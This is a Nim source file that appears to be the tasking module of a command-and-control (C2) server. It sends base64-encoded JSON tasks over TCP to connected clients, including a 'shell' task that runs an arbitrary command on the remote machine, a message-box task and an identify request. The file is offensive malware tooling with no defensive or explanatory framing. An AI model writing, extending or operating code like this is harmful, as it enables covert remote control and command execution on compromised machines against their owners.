import asyncdispatch, asyncnet, json, base64

import types

proc sendTask*(client: C2Client, pl: string) {.async.} =
  if client.listenerType == "tcp":
    let tcpSocket: TCPSocket = client.getTcpSocket()
    await tcpSocket.socket.send(encode($pl) & "\r\n")

proc awaitResponse*(client: C2Client) {.async.} =
    if client.server.clRespFuture[].isNil():
        client.server.clRespFuture[] = newFuture[void]()
    await client.server.clRespFuture[]

proc sendShellCmd*(client: C2Client, cmd: string) {.async.} =
    var j = %*
        {
            "task": "shell",
            "shellCmd": cmd
        }
    await client.sendTask($j)

proc sendMsgBox*(client: C2Client, title: string, caption: string) {.async.} =
    var j = %*
        {
            "task": "msgbox",
            "title": title,
            "caption": caption
        }
    await client.sendTask($j)

proc askToIdentify*(client: C2Client) {.async.} =
    await client.sendTask("hi")
